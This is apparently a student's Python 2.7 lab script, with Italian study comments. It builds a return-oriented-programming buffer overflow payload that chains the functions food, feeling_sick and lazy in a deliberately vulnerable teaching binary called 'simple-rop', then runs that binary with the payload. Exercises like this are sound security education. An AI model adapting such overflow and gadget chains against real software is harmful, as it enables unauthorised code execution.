# NOTE: For Python 2.7
# to find out the gadgets address you need to download the ROPgadget from 
# this link: https://github.com/JonathanSalwan/ROPgadget.git


import os
import struct

#NOTA: CAMBIATI valori gadget e funzioni !!!!!

#Find gadgets
#COME TROVARE I GADGET? comando dentro la cartella rop:
# ROPgadget --binary simple-rop
pop_ret = 0x0804830d #0x080483ea start address of a pop,ret sequence
pop_pop_ret = 0x080484ec # start address of a pop,pop,ret sequence

#questi sotto sono indirizzi di funzioni: print nome_funzione su gdb
lazy = 0x0804846b #0x080489cc # objdump -d | grep lazy
food = 0x08048490 #0x080489f7# objdump -d | grep food
feeling_sick = 0x080484ef #0x08048a59  # objdump -d | grep feeling_sick

#Buffer Overflow
payload = "A"*0x6c
payload += "BBBB"

#food(0xdeadbeef) gadget
#--> qui devo arrivare a food: bisogna fare in modo che magic sia uguale al valore 0xdeadbeef per entrare e fare strcat
payload += struct.pack("I", food)
payload += struct.pack("I", pop_ret) #perche` uso ha il gadget pop ret? la pop ret pulisce (p.22 appunti)
payload += struct.pack("I", 0xdeadbeef) #<--ecco il valore

#feeling_sick(0xd15ea5e, 0x0badf00d) gadget
#quando vado a chiamare feeling_sick che ha due parametri: magic1 e magic2 che devo dare
payload += struct.pack("I", feeling_sick)
payload += struct.pack("I", pop_pop_ret) #<-- in questo caso ho due valori quindi due pop per scavalcare i parametri che metto sopra nello stack e riuscire a chiamare la funzione successiva
payload += struct.pack("I", 0xd15ea5e) #<-- sono segnati nel programma
payload += struct.pack("I", 0x0badf00d)

payload += struct.pack("I", lazy)

#f = open("badfile", "a")
#f.write("%s" % payload) 
#f.close()
os.system("./simple-rop \"%s\"" % payload)
